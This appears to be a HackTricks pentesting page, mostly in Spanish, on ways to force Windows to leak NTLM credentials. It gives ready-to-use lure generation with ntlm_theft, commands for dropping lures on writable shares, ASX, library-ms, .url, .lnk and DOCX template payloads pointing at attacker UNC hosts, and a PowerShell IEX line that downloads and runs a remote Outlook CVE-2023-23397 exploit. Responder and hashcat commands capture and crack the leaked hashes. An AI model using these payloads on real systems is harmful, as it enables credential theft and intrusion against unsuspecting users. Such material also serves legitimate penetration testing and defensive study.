# Lugares para robar credenciales NTLM

{{#include ../../banners/hacktricks-training.md}}

**Revisa todas las grandes ideas de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) desde la descarga de un archivo de Microsoft Word en línea hasta la fuente de ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md y [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Compartición SMB con permisos de escritura + señuelos UNC activados por Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Si puedes **escribir en un share que usuarios o tareas programadas exploran en Explorer**, deja archivos cuya metadata apunte a tu UNC (p. ej. `\\ATTACKER\share`). Al renderizar la carpeta se desencadena la **autenticación SMB implícita** y leaks un **NetNTLMv2** a tu listener.

1. **Generar señuelos** (cubre SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Déjalos en la carpeta compartida con permisos de escritura** (cualquier carpeta que la víctima abra):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows puede acceder a varios archivos a la vez; cualquier vista previa de Explorer (`BROWSE TO FOLDER`) no requiere clics.

### Windows Media Player playlists (.ASX/.WAX)

Si puedes conseguir que un objetivo abra o previsualice una playlist de Windows Media Player que controles, puedes provocar un leak de Net‑NTLMv2 apuntando la entrada a una ruta UNC. WMP intentará recuperar el medio referenciado vía SMB y se autenticará implícitamente.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flujo de recopilación y cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### .library-ms embebido en ZIP NTLM leak (CVE-2025-24071/24055)

Windows Explorer maneja de forma insegura los archivos .library-ms cuando se abren directamente desde un archivo ZIP. Si la definición de la library apunta a una ruta UNC remota (p. ej., \\attacker\share), simplemente navegar/abrir el .library-ms dentro del ZIP hace que Explorer enumere la UNC y emita autenticación NTLM al atacante. Esto genera un NetNTLMv2 que puede ser cracked offline o potencialmente relayed.

Mínimo .library-ms que apunta a una UNC del atacante
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Create the .library-ms file with the XML above (set your IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
- Run an NTLM capture listener and wait for the victim to open the .library-ms from inside the ZIP.


### Ruta del sonido del recordatorio del calendario de Outlook (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows procesaba la propiedad extendida MAPI PidLidReminderFileParameter en los elementos del calendario. Si esa propiedad apunta a una ruta UNC (p. ej., \\attacker\share\alert.wav), Outlook contactaría el recurso SMB cuando se active el recordatorio, leaking the user’s Net‑NTLMv2 without any click. Esto se parcheó el 14 de marzo de 2023, pero sigue siendo muy relevante para flotas legacy/untouched y para la respuesta a incidentes históricos.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener side:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notas
- Una víctima solo necesita Outlook for Windows en ejecución cuando se activa el recordatorio.
- El leak produce Net‑NTLMv2 adecuado para offline cracking o relay (no pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer muestra automáticamente los iconos de los accesos directos. Investigaciones recientes demostraron que incluso después del parche de Microsoft de abril de 2025 para los shortcuts con icono UNC, todavía era posible desencadenar la autenticación NTLM sin clics alojando el objetivo del shortcut en una ruta UNC y manteniendo el icono local (bypass del parche asignado CVE‑2025‑50154). Simplemente ver la carpeta hace que Explorer recupere metadatos del objetivo remoto, emitiendo NTLM al servidor SMB del atacante.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload de acceso directo de programa (.lnk) vía PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Drop the shortcut in a ZIP and get the victim to browse it.
- Place the shortcut on a writable share the victim will open.
- Combine with other lure files in the same folder so Explorer previews the items.

### Sin clic .LNK NTLM leak vía ExtraData icon path (CVE‑2026‑25185)

Windows loads `.lnk` metadata during **view/preview** (icon rendering), not only on execution. CVE‑2026‑25185 shows a parsing path where **ExtraData** blocks cause the shell to resolve an icon path and touch the filesystem **during load**, emitting outbound NTLM when the path is remote.

Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
- Include **DARWIN_PROPS** (`0xa0000006`) in ExtraData (gate to icon update routine).
- Include **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) with **TargetUnicode** populated.
- The loader expands environment variables in `TargetUnicode` and calls `PathFileExistsW` on the resulting path.

If `TargetUnicode` resolves to a UNC path (e.g., `\\attacker\share\icon.ico`), **simplemente ver una carpeta** containing the shortcut causes outbound authentication. The same load path can also be hit by **indexing** and **AV scanning**, making it a practical no‑click leak surface.

Research tooling (parser/generator/UI) is available in the **LnkMeMaybe** project to build/inspect these structures without using the Windows GUI.


### Inyección de plantilla remota de Office (.docx/.dotm) para forzar NTLM

Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edita word/_rels/settings.xml.rels y apunta rId1337 a tu UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Reempaqueta a .docx y entrega. Ejecuta tu listener de captura SMB y espera a que se abra.

Para ideas posteriores a la captura sobre relaying o abuso de NTLM, consulta:

{{#ref}}
README.md
{{#endref}}


## Referencias
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
